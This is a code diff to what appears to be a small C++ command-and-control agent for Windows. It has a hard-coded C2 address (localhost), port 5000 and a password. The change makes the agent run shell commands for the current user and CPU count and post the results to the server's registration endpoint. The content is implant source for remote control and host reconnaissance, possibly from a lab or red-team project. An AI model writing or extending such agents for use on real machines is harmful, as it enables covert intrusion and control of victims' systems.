@@ -3,14 +3,13 @@
 #include <iostream>
 #include <stdlib.h>
 #include "http.h"
+#include "exec_shell.h"
 
 LPCWSTR c2Domain = L"127.0.0.1";
 LPCWSTR registerURI = L"/register_agent";
 std::string password = "password";
-std::string whoami = "agent"; 
 int port = 5000;
 std::string agentId;
-int cpus = 1;
 
 // generate a random agent id of size digits
 std::string generateRandomId(int size) {
@@ -23,9 +22,9 @@ std::string generateRandomId(int size) {
 
 // register the agent on the c2 server
 BOOL registerAgent() {
-    std::string payload = "{\"whoami\":\"" + whoami + "\",\"agent_id\":" + agentId + 
-                          ",\"password\":\"" + password + "\",\"cpus\":" + std::to_string(cpus) + "}";
-    // std::cout << payload << std::endl;
+    std::string payload = "{\"whoami\":\"" + exec_shell(CommonCmd::whoami) + "\",\"agent_id\":" + agentId + 
+                          ",\"password\":\"" + password + "\",\"cpus\":" + exec_shell(CommonCmd::cpu_num) + "}";
+    std::cout << payload << std::endl;
     std::string response = httpPost(c2Domain, port, registerURI, payload);
     std::cout << response << std::endl;
     return TRUE;
